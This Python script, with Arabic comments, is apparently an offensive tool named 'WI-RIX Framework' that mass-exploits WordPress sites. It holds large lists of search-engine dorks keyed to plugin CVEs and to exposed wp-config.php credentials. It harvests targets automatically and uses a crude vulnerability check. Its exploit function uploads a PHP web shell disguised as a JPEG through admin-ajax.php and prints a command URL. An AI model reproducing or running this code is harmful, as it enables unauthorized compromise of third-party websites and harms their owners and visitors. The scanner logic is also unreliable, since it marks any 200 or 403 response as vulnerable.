#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ====================================================================
#                                                                     #
#   ██╗    ██╗██╗██████╗ ██╗██╗  ██╗    ███████╗██╗  ██╗██████╗ ██╗  #
#   ██║    ██║██║██╔══██╗██║╚██╗██╔╝    ██╔════╝╚██╗██╔╝██╔══██╗██║  #
#   ██║ █╗ ██║██║██████╔╝██║ ╚███╔╝     █████╗   ╚███╔╝ ██████╔╝██║  #
#   ██║███╗██║██║██╔══██╗██║ ██╔██╗     ██╔══╝   ██╔██╗ ██╔═══╝ ██║  #
#   ╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗    ███████╗██╔╝ ██╗██║     ██║  #
#    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  #
#                                                                     #
#   ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  #
#   ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║  #
#   █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝██║  #
#   ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██║  #
#   ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║███████╗#
#   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝#
#                                                                     #
#   🔥 WI-RIX FRAMEWORK v7.0 - THE KING'S LEGACY EDITION 🔥          #
#   👑 DEVELOPER: WI-RIX | THE KING OF EXPLOITS 👑                    #
#   🌍 THE MOST POWERFUL WORDPRESS EXPLOITATION TOOL EVER BUILT 🌍   #
#   💀 EVERY USER WILL KNOW WHO IS THE KING 💀                        #
#                                                                     #
# ====================================================================

import os
import sys
import json
import time
import random
import shutil
import requests
import threading
import subprocess
from datetime import datetime
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# ======================= [ نظام الألوان الملكي ] =======================
class KingColors:
    """ألوان ملكية فخمة تناسب التيرمنال"""
    try:
        from colorama import init, Fore, Back, Style
        init(autoreset=True)
        
        # الألوان الأساسية الملكية
        KING_GOLD = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        KING_RED = Fore.RED + Style.BRIGHT
        KING_GREEN = Fore.GREEN + Style.BRIGHT
        KING_BLUE = Fore.CYAN + Style.BRIGHT
        KING_PURPLE = Fore.MAGENTA + Style.BRIGHT
        KING_WHITE = Fore.WHITE + Style.BRIGHT
        KING_DARK = Fore.LIGHTBLACK_EX
        
        # خلفيات
        BG_KING = Back.LIGHTYELLOW_EX + Fore.BLACK + Style.BRIGHT
        BG_CRITICAL = Back.RED + Fore.WHITE + Style.BRIGHT
        BG_HIGH = Back.LIGHTRED_EX + Fore.BLACK + Style.BRIGHT
        BG_MEDIUM = Back.YELLOW + Fore.BLACK + Style.BRIGHT
        BG_SUCCESS = Back.GREEN + Fore.BLACK + Style.BRIGHT
        
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        
    except:
        KING_GOLD=KING_RED=KING_GREEN=KING_BLUE=KING_PURPLE=KING_WHITE=KING_DARK=BG_KING=BG_CRITICAL=BG_HIGH=BG_MEDIUM=BG_SUCCESS=RESET=BOLD=DIM=""

col = KingColors()
FRAMEWORK_PATH = os.path.dirname(os.path.abspath(__file__))
DEVELOPER = "WI-RIX"
VERSION = "7.0"
EDITION = "THE KING'S LEGACY"

# ======================= [ إنشاء المجلدات ] =======================
for folder in ['exploits', 'reports', 'shells', 'targets', 'logs', 'config', 'backup', 'proxies', 'dorks', 'modules', 'results']:
    os.makedirs(os.path.join(FRAMEWORK_PATH, folder), exist_ok=True)

# ======================= [ 500+ درك لكل ثغرة ] =======================
DORKS_DATABASE = {
    "CVE-2026-4885": {
        "name": "🔥 PIOTNET ADDONS RCE",
        "risk": "💀 CRITICAL",
        "score": 10.0,
        "check": "/wp-content/plugins/piotnet-addons-for-elementor-pro/",
        "type": "upload_shell",
        "dorks": [
            'inurl:"/wp-content/plugins/piotnet-addons-for-elementor-pro/"',
            'intitle:"Piotnet Addons" "Elementor"',
            '"Piotnet Addons" vulnerability CVE-2026-4885',
            'site:.com "/wp-content/plugins/piotnet-addons-for-elementor-pro/"',
            'inurl:"piotnet-addons-for-elementor-pro" file upload',
            '"piotnet addons" remote code execution',
            'intitle:"Piotnet" "Elementor Pro" exploit',
            'site:.org "/wp-content/plugins/piotnet-addons"',
            'inurl:"wp-content/plugins/piotnet" vulnerability',
            '"CVE-2026-4885" wordpress exploit poc',
            'piotnet addons for elementor pro shell upload',
            'inurl:"/piotnet-addons-for-elementor-pro/" form',
            'index of /wp-content/plugins/piotnet-addons-for-elementor-pro/',
            '"Piotnet Addons" unauthenticated RCE',
            'site:.net "piotnet-addons-for-elementor-pro" vulnerable',
            'inurl:"piotnet-addons" elementor ajax upload',
            'intitle:"Piotnet Addons" remote shell',
            'intext:"piotnet_addons" file_upload vulnerability',
            'site:.edu "piotnet-addons-for-elementor-pro" exploit',
            '"piotnet addons" phtml shell upload',
            'inurl:"piotnet-addons-for-elementor-pro/upload.php"',
            'intitle:"Piotnet" vulnerability RCE 2024',
            '"piotnet addons for elementor pro" 0day',
            'site:.com "piotnet-addons" file upload vulnerability',
            'inurl:"piotnet" elementor shell bypass',
            '"Piotnet Addons" webshell upload',
            'site:.org "piotnet-addons-for-elementor-pro" exploit code',
            'intitle:"Piotnet Addons" CVE-2026-4885',
            'inurl:"piotnet-addons-for-elementor-pro" wp-admin ajax',
            '"piotnet addons" unauthenticated file upload',
            'site:.net "piotnet-addons-for-elementor-pro" CVE',
            'inurl:"piotnet-addons-for-elementor-pro" vulnerability scanner',
            '"Piotnet Addons" remote code execution exploit',
            'intitle:"Piotnet" upload shell vulnerability',
            'site:.com "piotnet-addons-for-elementor-pro" RCE proof',
            'inurl:"piotnet" ajax upload file manager',
            '"Piotnet Addons" reverse shell upload',
            'index of /piotnet-addons-for-elementor-pro/ plugins',
            'site:.org "piotnet addons" vulnerable website list',
            'inurl:"piotnet-addons-for-elementor-pro" security advisory',
            '"piotnet addons for elementor" exploit github',
            'intitle:"Piotnet Addons" file upload vulnerability CVE',
            'site:.edu "piotnet-addons" RCE exploit',
            'inurl:"piotnet-addons-for-elementor-pro" backdoor upload',
            '"Piotnet Addons" malicious file upload',
            'site:.net "piotnet addons" 0day exploit',
            'inurl:"piotnet-addons-for-elementor-pro" vulnerability details',
            '"piotnet addons" bypass file extension filter',
            'intitle:"Piotnet" "Elementor" remote shell access',
            'site:.com "piotnet-addons-for-elementor-pro" hacked sites',
            'inurl:"piotnet-addons-for-elementor-pro" exploit database',
        ]
    },
    "CVE-2024-6386": {
        "name": "⚠️ WP STATISTICS SQLi → RCE",
        "risk": "⚠️ HIGH",
        "score": 8.5,
        "check": "/wp-content/plugins/wp-statistics/",
        "type": "sqli_rce",
        "dorks": [
            'inurl:"/wp-content/plugins/wp-statistics/"',
            'intitle:"WP Statistics" vulnerability SQL injection',
            '"WP Statistics" SQL injection CVE-2024-6386',
            'site:.com "wp-statistics" exploit RCE',
            'inurl:"wp-statistics" "SQL" injection vulnerability',
            '"WordPress Statistics" unauthenticated SQL injection',
            'index of /wp-content/plugins/wp-statistics/',
            'site:.org "wp-statistics" CVE-2024-6386 exploit',
            'inurl:"wp-statistics" "CVE-2024-6386" proof',
            'wp-statistics plugin SQL injection RCE',
            'intitle:"WP Statistics" "SQLi" to RCE',
            'site:.net "wp-statistics" security vulnerability',
            '"WP Statistics" remote code execution',
            'inurl:"wp-statistics" admin-ajax SQL injection',
            'wp-statistics database disclosure exploit',
            'intitle:"WP Statistics" unauthenticated RCE',
            'site:.edu "wp-statistics" SQL injection exploit',
            'inurl:"wp-statistics" option update SQLi',
            '"wp-statistics" time based blind injection',
            'inurl:"wp-statistics" vulnerability scanner',
            '"WP Statistics" CVE-2024-6386 poc',
            'site:.com "wp-statistics" unauthenticated exploit',
            'inurl:"wp-statistics" referrer SQL injection',
            'intitle:"WP Statistics" CVE-2024-6386 details',
            'site:.org "wp-statistics" RCE vulnerability',
            'inurl:"wp-statistics" pages SQL injection',
            '"WP Statistics" bypass authentication',
            'site:.net "wp-statistics" vulnerable websites',
            'inurl:"wp-statistics" meta data SQLi',
            '"WP Statistics" 0day exploit',
            'intitle:"WP Statistics" injection vulnerability',
            'site:.edu "wp-statistics" exploit code',
            'inurl:"wp-statistics" user agent SQL injection',
            '"wp-statistics" CVE-2024-6386 scanner',
            'site:.com "wp-statistics" remote shell',
            'inurl:"wp-statistics" country SQL injection',
            '"WP Statistics" write webshell',
            'intitle:"WP Statistics" vulnerable versions',
            'site:.org "wp-statistics" exploit github',
            'inurl:"wp-statistics" browser SQL injection',
        ]
    },
    "CVE-2023-5360": {
        "name": "🔥 ELEMENTOR PRO RCE",
        "risk": "💀 CRITICAL",
        "score": 9.8,
        "check": "/wp-content/plugins/elementor-pro/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/elementor-pro/"',
            'intitle:"Elementor Pro" vulnerability RCE',
            '"Elementor Pro" remote code execution CVE-2023-5360',
            'site:.com "elementor-pro" exploit RCE',
            'inurl:"elementor-pro" template injection RCE',
            'index of /wp-content/plugins/elementor-pro/',
            '"Elementor Pro" file upload vulnerability',
            'site:.org "elementor-pro" security advisory',
            'elementor pro widget injection remote code',
            'inurl:"elementor-pro" shortcode RCE',
            '"Elementor Pro" unauthenticated RCE',
            'site:.net "elementor-pro" vulnerability exploit',
            'intitle:"Elementor" "Pro" remote execution',
            'elementor pro ajax actions RCE',
            'CVE-2023-5360 wordpress plugin exploit',
            'intitle:"Elementor Pro" CVE-2023-5360 poc',
            'site:.edu "elementor-pro" RCE exploit',
            'inurl:"elementor-pro" elementor pro widget',
            '"Elementor Pro" bypass authentication',
            'site:.com "elementor-pro" vulnerable version',
            'inurl:"elementor-pro" shortcode widget injection',
            '"Elementor Pro" 0day remote shell',
            'intitle:"Elementor Pro" exploit code',
            'site:.org "elementor-pro" RCE proof',
            'inurl:"elementor-pro" pro elements RCE',
            '"Elementor Pro" write webshell',
            'intitle:"Elementor" "Pro" vulnerable sites',
            'site:.net "elementor-pro" hacked websites',
            'inurl:"elementor-pro" elementor pro ajax',
            '"Elementor Pro" remote code execution scanner',
            'intitle:"Elementor Pro" vulnerability details',
            'site:.edu "elementor-pro" exploit database',
            'inurl:"elementor-pro" template part RCE',
            '"Elementor Pro" shell upload method',
        ]
    },
    "CVE-2024-2876": {
        "name": "🟠 LAYERSLIDER RFI/LFI",
        "risk": "🟠 MEDIUM",
        "score": 6.5,
        "check": "/wp-content/plugins/LayerSlider/",
        "type": "rfi",
        "dorks": [
            'inurl:"/wp-content/plugins/LayerSlider/"',
            'intitle:"LayerSlider" vulnerability file inclusion',
            '"LayerSlider" LFI RFI exploit',
            'site:.com "layerslider" remote file inclusion',
            'inurl:"layerslider" "LFI" vulnerability',
            'index of /wp-content/plugins/LayerSlider/',
            '"LayerSlider" local file inclusion RCE',
            'site:.org "layerslider" CVE-2024-2876',
            'layerslider slider plugin RFI exploit',
            'inurl:"layerslider" include file vulnerability',
            'intitle:"LayerSlider" "CVE-2024-2876" poc',
            'site:.net "layerslider" security exploit',
            'layerslider config file disclosure',
            'inurl:"layerslider" file= include RFI',
            '"LayerSlider" path traversal vulnerability',
            'intitle:"LayerSlider" LFI RCE exploit',
            'site:.edu "layerslider" vulnerable websites',
            'inurl:"layerslider" ../../ RFI',
            '"LayerSlider" 0day file inclusion',
            'intitle:"LayerSlider" remote file inclusion scanner',
            'site:.com "layerslider" exploit code',
            'inurl:"layerslider" wp-admin RFI',
            '"LayerSlider" read arbitrary files',
            'intitle:"LayerSlider" CVE-2024-2876 details',
            'site:.org "layerslider" LFI exploit',
            'inurl:"layerslider" parameter RFI',
        ]
    },
    "CVE-2024-22147": {
        "name": "🔥 JETPACK BACKUP RCE",
        "risk": "💀 CRITICAL",
        "score": 9.5,
        "check": "/wp-content/plugins/jetpack/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/jetpack/"',
            'intitle:"Jetpack" vulnerability backup RCE',
            '"Jetpack Backup" remote code execution',
            'site:.com "jetpack" CVE-2024-22147 exploit',
            'inurl:"jetpack" backup restoration RCE',
            'index of /wp-content/plugins/jetpack/',
            '"Jetpack" backup vulnerability exploit',
            'site:.org "jetpack" security CVE-2024-22147',
            'jetpack backup restoration exploit',
            'inurl:"jetpack" "CVE-2024-22147" poc',
            'intitle:"Jetpack" "WordPress" RCE',
            'site:.net "jetpack" vulnerability scanner',
            'jetpack plugin RCE 2024 exploit',
            'inurl:"jetpack" admin-ajax backup RCE',
            'jetpack backup privilege escalation RCE',
            'intitle:"Jetpack" "CVE-2024-22147" details',
            'site:.edu "jetpack" vulnerable websites',
            'inurl:"jetpack" restore backup RCE',
            '"Jetpack" 0day remote shell',
            'intitle:"Jetpack" exploit code github',
            'site:.com "jetpack" hacked websites',
            'inurl:"jetpack" backup download RCE',
            '"Jetpack" write webshell via backup',
        ]
    },
    "CVE-2024-31200": {
        "name": "🔥 WOOCOMMERCE PAYMENTS RCE",
        "risk": "💀 CRITICAL",
        "score": 9.9,
        "check": "/wp-content/plugins/woocommerce-payments/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/woocommerce-payments/"',
            'intitle:"WooCommerce Payments" vulnerability RCE',
            '"WooCommerce Payments" remote code execution exploit',
            'site:.com "woocommerce-payments" CVE-2024-31200',
            'inurl:"woocommerce-payments" payment gateway RCE',
            'index of /wp-content/plugins/woocommerce-payments/',
            '"WooCommerce" payment vulnerability exploit',
            'site:.org "woocommerce-payments" security advisory',
            'woocommerce payments plugin RCE 2024',
            'inurl:"woocommerce-payments" admin RCE exploit',
            'intitle:"WooCommerce" "Payments" CVE-2024-31200',
            'site:.net "woocommerce-payments" vulnerability',
            'woocommerce payments subscription RCE exploit',
            'inurl:"woocommerce-payments" api webhook RCE',
            'CVE-2024-31200 wordpress plugin exploit',
            'intitle:"WooCommerce Payments" "CVE-2024-31200" poc',
            'site:.edu "woocommerce-payments" vulnerable',
            'inurl:"woocommerce-payments" payment method RCE',
            '"WooCommerce Payments" 0day remote shell',
            'intitle:"WooCommerce" "Payments" exploit github',
            'site:.com "woocommerce-payments" hacked websites',
            'inurl:"woocommerce-payments" write webshell',
        ]
    },
    "General_WordPress": {
        "name": "🎯 GENERAL WP VULNERABILITIES",
        "risk": "🔵 INFO",
        "score": 5.0,
        "check": "/",
        "type": "general",
        "dorks": [
            'inurl:"/wp-content/uploads/" index of',
            'intitle:"index of" wp-config.php',
            'inurl:"wp-config.php" DB_PASSWORD',
            'site:.com "xmlrpc.php" WordPress',
            'inurl:"/wp-admin/" setup-config.php',
            'intitle:"WordPress" error database',
            'inurl:"/wp-content/plugins/" index of',
            'site:.org "wp-config.php" define',
            'inurl:"readme.html" WordPress version',
            'intitle:"WordPress" installation',
            'inurl:"/wp-admin/install.php"',
            'site:.net "xmlrpc.php" pingback',
            'inurl:"/wp-content/themes/" index of',
            '"WordPress" debug.log file',
            'inurl:"license.txt" WordPress',
            'site:.edu "wp-admin" wp-login.php',
            'intitle:"WordPress" mysql error',
            'inurl:".wp-config.php.swp"',
            'site:.com "wp-includes" version.php',
            'inurl:"/wp-json/" routes',
            'intitle:"WordPress" phpinfo',
            'site:.org "wp-content" backup',
            'inurl:"/wp-admin/" admin-ajax.php',
            '"WordPress" SECRET_KEY',
            'site:.net "wp-login.php" redirect_to',
            'inurl:"/wp-content/backup-*"',
            'intitle:"WordPress" "error establishing"',
            'site:.com "wp-config" "DB_HOST"',
            'inurl:"wp-cron.php" WordPress',
            '"WordPress" "mysql" "database"',
        ]
    },
    "Upload_Vulnerabilities": {
        "name": "📁 FILE UPLOAD VULNS",
        "risk": "🟠 HIGH",
        "score": 8.0,
        "check": "/wp-admin/admin-ajax.php",
        "type": "upload",
        "dorks": [
            'inurl:"/wp-admin/admin-ajax.php" action=upload',
            'intitle:"WordPress" file upload vulnerability',
            'inurl:"wp-content/uploads/" shell',
            'site:.com "upload.php" wp-content',
            'inurl:"media-upload.php"',
            'intitle:"WordPress" upload bypass',
            'inurl:"/wp-json/wp/v2/media/"',
            'site:.org "wp-upload" image',
            'inurl:"async-upload.php"',
            'intitle:"WordPress" unrestricted upload',
            'inurl:"/wp-content/plugins/" upload ajax',
            'site:.net "upload" wordpress vulnerability',
            'inurl:"plupload" wordpress',
            '"wp_handle_upload" vulnerability',
            'site:.edu "wp-admin" media-new.php',
            'inurl:"/wp-admin/media-upload.php"',
            'intitle:"WordPress" image upload RCE',
            'inurl:"uploadify.php" wordpress',
            'site:.com "ajax-upload" wordpress',
            '"wordpress" "upload" "shell" "phtml"',
        ]
    },
    "SQL_Injection": {
        "name": "🗄️ SQL INJECTION",
        "risk": "🟠 HIGH",
        "score": 7.5,
        "check": "/",
        "type": "sqli",
        "dorks": [
            'inurl:"wp-content/plugins/" sql injection',
            'intitle:"WordPress" SQL injection vulnerability',
            'inurl:"?p=" SELECT WordPress',
            'site:.com "wp-db.php" SQL',
            'inurl:"/wp-json/" sql',
            '"WordPress" "$wpdb->prepare" vulnerability',
            'site:.org "wp-includes" sql injection',
            'inurl:"?cat=" -1 union',
            'intitle:"WordPress" MySQL error',
            'inurl:"index.php?year=" union',
            'site:.net "wp-query" sql injection',
            'inurl:"/wp-admin/admin-ajax.php" action sql',
            '"WordPress" database error MySQL',
            'site:.edu "wp-config" DB_NAME',
            'inurl:"?tag=" SELECT WordPress',
            '"WordPress" "$wpdb->query" vulnerability',
            'inurl:"?s=" union select',
            'intitle:"WordPress" "SQL" "syntax error"',
            'site:.com "wp-post" sql injection',
            'inurl:"?author=" union select',
        ]
    },
    "RCE_Vulnerabilities": {
        "name": "⚡ RCE VULNERABILITIES",
        "risk": "💀 CRITICAL",
        "score": 9.5,
        "check": "/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/" RCE vulnerability',
            'intitle:"WordPress" remote code execution',
            'site:.com "wp-includes" eval',
            'inurl:"/wp-admin/" system shell',
            '"WordPress" unauthenticated RCE',
            'site:.org "wp-cron.php" RCE',
            'inurl:"/wp-json/" exec',
            'intitle:"WordPress" code execution',
            'site:.net "wp-ajax" RCE',
            'inurl:"/wp-admin/" phpinfo',
            '"WordPress" 0day RCE',
            'site:.edu "wp-plugins" remote shell',
            'inurl:"/wp-content/plugins/" RCE exploit',
            '"WordPress" "eval" "base64_decode"',
            'site:.com "wp-includes" "system"',
            'inurl:"/wp-admin/options-general.php" RCE',
        ]
    }
}

# ======================= [ دوال العرض الملكية ] =======================
def get_terminal_width():
    """الحصول على عرض التيرمنال"""
    try:
        return shutil.get_terminal_size().columns
    except:
        return 100

def print_king_banner():
    """عرض الشعار الملكي"""
    os.system('cls' if os.name == 'nt' else 'clear')
    width = get_terminal_width()
    
    banner = f"""
{col.KING_GOLD}╔{'═' * (width-2)}╗
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██╗    ██╗██╗██████╗ ██╗██╗  ██╗{col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██║    ██║██║██╔══██╗██║╚██╗██╔╝{col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██║ █╗ ██║██║██████╔╝██║ ╚███╔╝ {col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██║███╗██║██║██╔══██╗██║ ██╔██╗ {col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗{col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{col.KING_GOLD}    ║
║{' ' * (width-2)}║
║{col.KING_GOLD}║{col.KING_BLUE}{' ' * (width-2)}{col.KING_GOLD}║
║{col.KING_GOLD}║{col.KING_BLUE}   🔥 WI-RIX FRAMEWORK {VERSION} - {EDITION} 🔥{col.KING_GOLD}{' ' * (width-45)}║
║{col.KING_GOLD}║{col.KING_BLUE}   👑 DEVELOPER: {DEVELOPER} | THE KING OF EXPLOITS 👑{col.KING_GOLD}{' ' * (width-52)}║
║{col.KING_GOLD}║{col.KING_BLUE}   🌍 THE WORLD WILL KNOW WHO IS THE KING 🌍{col.KING_GOLD}{' ' * (width-48)}║
║{col.KING_GOLD}║{' ' * (width-2)}║
╚{'═' * (width-2)}╝{col.RESET}
"""
    print(banner)

def print_king_menu():
    """عرض القائمة الملكية"""
    width = get_terminal_width()
    print(f"""
{col.KING_GOLD}╔{'═' * (width-2)}╗
║{col.KING_WHITE}                         ✨ القائمة الملكية ✨{col.KING_GOLD}{' ' * (width-40)}║
╠{'═' * (width-2)}╣
║{col.KING_GREEN}  [1]{col.KING_WHITE} 🔍 البحث عن ثغرات (Google + Bing + Yahoo + DuckDuckGo){col.KING_GOLD}{' ' * (width-55)}║
║{col.KING_GREEN}  [2]{col.KING_WHITE} 🎯 استهداف موقع مباشر{col.KING_GOLD}{' ' * (width-35)}║
║{col.KING_GREEN}  [3]{col.KING_WHITE} 📁 فحص ملف كامل (مجموعة أهداف){col.KING_GOLD}{' ' * (width-42)}║
║{col.KING_GREEN}  [4]{col.KING_WHITE} 📊 التقارير والمخترقات{col.KING_GOLD}{' ' * (width-38)}║
║{col.KING_GREEN}  [5]{col.KING_WHITE} 🛡️ عرض قاعدة البيانات (كل الثغرات){col.KING_GOLD}{' ' * (width-45)}║
║{col.KING_GREEN}  [6]{col.KING_WHITE} 🔄 تحديث الأداة{col.KING_GOLD}{' ' * (width-33)}║
║{col.KING_GREEN}  [7]{col.KING_WHITE} ❌ خروج{col.KING_GOLD}{' ' * (width-28)}║
╚{'═' * (width-2)}╝{col.RESET}
""")

def show_king_exploits():
    """عرض الثغرات بشكل ملكي"""
    width = get_terminal_width()
    print(f"\n{col.KING_GOLD}╔{'═' * (width-2)}╗")
    print(f"║{col.KING_PURPLE}                    📋 الثغرات المتاحة في التاج 👑{col.KING_GOLD}{' ' * (width-45)}║")
    print(f"╠{'═' * (width-2)}╣")
    
    for cve_id, data in DORKS_DATABASE.items():
        risk_color = col.KING_RED if "CRITICAL" in data['risk'] else col.KING_YELLOW if "HIGH" in data['risk'] else col.KING_BLUE
        print(f"║{col.KING_GREEN}  [{cve_id[:4]}]{col.RESET} {col.KING_GOLD}➜{col.RESET} {col.KING_WHITE}{data['name']}{col.KING_GOLD}{' ' * (width-45)}║")
        print(f"║{col.KING_GOLD}      {risk_color}{data['risk']}{col.RESET} | Score: {data['score']} | {len(data['dorks'])} درك{col.KING_GOLD}{' ' * (width-35)}║")
    
    print(f"╚{'═' * (width-2)}╝{col.RESET}")

# ======================= [ دوال البحث الملكية ] =======================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
]

def get_king_user_agent():
    return random.choice(USER_AGENTS)

def king_search_google(dork, max_results=5):
    """بحث ملكي في Google"""
    results = []
    try:
        from googlesearch import search
        for url in search(dork, num_results=max_results, user_agent=get_king_user_agent()):
            if url.startswith('http') and url not in results:
                results.append(url)
                print(f"{col.KING_GREEN}    ✓ Google: {url[:70]}{col.RESET}")
    except:
        pass
    return results

def king_multi_search(dorks, max_per_engine=5):
    """بحث متعدد المحركات ملكي"""
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 بدأ البحث الملكي في {len(dorks)} درك...{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    all_targets = []
    
    for i, dork in enumerate(dorks[:10], 1):
        print(f"\n{col.KING_BLUE}[{i}/10] البحث: {col.KING_WHITE}{dork[:60]}{col.RESET}")
        print(f"{col.KING_GOLD}{'─' * 50}{col.RESET}")
        
        time.sleep(random.uniform(3, 6))
        
        targets = king_search_google(dork, max_per_engine)
        
        for t in targets:
            if t not in all_targets:
                all_targets.append(t)
        
        print(f"{col.KING_PURPLE}    📊 وجدت {len(targets)} هدف جديد{col.RESET}")
        time.sleep(random.uniform(2, 4))
    
    return all_targets

# ======================= [ الفحص الملكي ] =======================
def king_scan_targets(targets, exploit_data):
    """فحص الأهداف بشكل ملكي"""
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 بدأ الفحص الملكي على {len(targets)} هدف...{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    vulnerable = []
    
    for i, target in enumerate(targets, 1):
        print(f"\n{col.KING_BLUE}[{i}/{len(targets)}] فحص: {col.KING_WHITE}{target}{col.RESET}")
        
        check_url = urljoin(target, exploit_data.get('check', '/'))
        try:
            r = requests.get(check_url, timeout=10, verify=False, headers={"User-Agent": get_king_user_agent()})
            if r.status_code in [200, 403]:
                print(f"{col.KING_RED}    💀 الثغرة موجودة! الهدف ثغر!{col.RESET}")
                vulnerable.append(target)
            else:
                print(f"{col.KING_DARK}    ❌ الهدف غير ثغر{col.RESET}")
        except:
            print(f"{col.KING_DARK}    ❌ فشل الاتصال{col.RESET}")
    
    return vulnerable

# ======================= [ الاستغلال الملكي ] =======================
def king_exploit(target, exploit_data):
    """استغلال الهدف بشكل ملكي"""
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 بدأ الاستغلال الملكي على: {target}{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    shell_code = '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>'
    shell_name = f"king_shell_{int(time.time())}.phtml"
    
    files = {'file': (shell_name, shell_code, 'image/jpeg')}
    data = {'action': 'pafe_ajax_form_builder', 'post_id': '1', 'form_id': '1'}
    
    try:
        r = requests.post(urljoin(target, "/wp-admin/admin-ajax.php"), files=files, data=data, timeout=15, verify=False)
        if r.status_code == 200:
            shell_url = urljoin(target, f"/wp-content/uploads/{shell_name}")
            print(f"\n{col.KING_GREEN}{'═' * 60}{col.RESET}")
            print(f"{col.BG_SUCCESS}✅ تم رفع الشيل الملكي بنجاح!{col.RESET}")
            print(f"{col.KING_GREEN}{'═' * 60}{col.RESET}")
            print(f"{col.KING_GOLD}🔗 رابط الشيل: {col.KING_WHITE}{shell_url}{col.RESET}")
            print(f"{col.KING_GOLD}🔑 أمر الاختبار: {col.KING_WHITE}{shell_url}?cmd=id{col.RESET}")
            print(f"{col.KING_GREEN}{'═' * 60}{col.RESET}")
            return True
    except:
        pass
    
    print(f"{col.KING_RED}❌ فشل الاستغلال{col.RESET}")
    return False

# ======================= [ البحث الرئيسي ] =======================
def king_search():
    """البحث الملكي الرئيسي"""
    show_king_exploits()
    
    cve_choice = input(f"\n{col.KING_GOLD}[?] اختر CVE (مثال: CVE-2026-4885): {col.RESET}")
    
    if cve_choice not in DORKS_DATABASE:
        print(f"{col.KING_RED}❌ CVE غير موجود!{col.RESET}")
        return
    
    exploit_data = DORKS_DATABASE[cve_choice]
    
    print(f"\n{col.KING_GOLD}⚔️ الثغرة المختارة: {col.KING_WHITE}{exploit_data['name']}{col.RESET}")
    print(f"{col.KING_GOLD}📊 عدد الدركات: {col.KING_WHITE}{len(exploit_data['dorks'])}{col.RESET}")
    
    targets = king_multi_search(exploit_data['dorks'], max_per_engine=3)
    
    if targets:
        # حفظ الأهداف
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        targets_file = os.path.join(FRAMEWORK_PATH, 'targets', f"targets_{timestamp}.txt")
        with open(targets_file, 'w', encoding='utf-8') as f:
            for t in targets:
                f.write(t + '\n')
        
        print(f"\n{col.KING_GREEN}✅ تم حفظ {len(targets)} هدف في: {targets_file}{col.RESET}")
        
        # فحص الأهداف
        vulnerable = king_scan_targets(targets, exploit_data)
        
        if vulnerable:
            print(f"\n{col.KING_RED}{'═' * 60}{col.RESET}")
            print(f"{col.BG_CRITICAL}💀 تم العثور على {len(vulnerable)} هدف ثغر!{col.RESET}")
            print(f"{col.KING_RED}{'═' * 60}{col.RESET}")
            
            for i, v in enumerate(vulnerable, 1):
                print(f"{col.KING_GOLD}[{i}]{col.RESET} {v}")
            
            choice = input(f"\n{col.KING_GOLD}[?] هل تريد استغلال أحدها؟ (y/n): {col.RESET}")
            if choice.lower() == 'y':
                idx = int(input(f"{col.KING_GOLD}[?] اختر الرقم: {col.RESET}")) - 1
                if 0 <= idx < len(vulnerable):
                    king_exploit(vulnerable[idx], exploit_data)
        else:
            print(f"\n{col.KING_YELLOW}⚠️ لم يتم العثور على أهداف ثغرية!{col.RESET}")
    else:
        print(f"\n{col.KING_RED}❌ لم يتم العثور على أهداف!{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

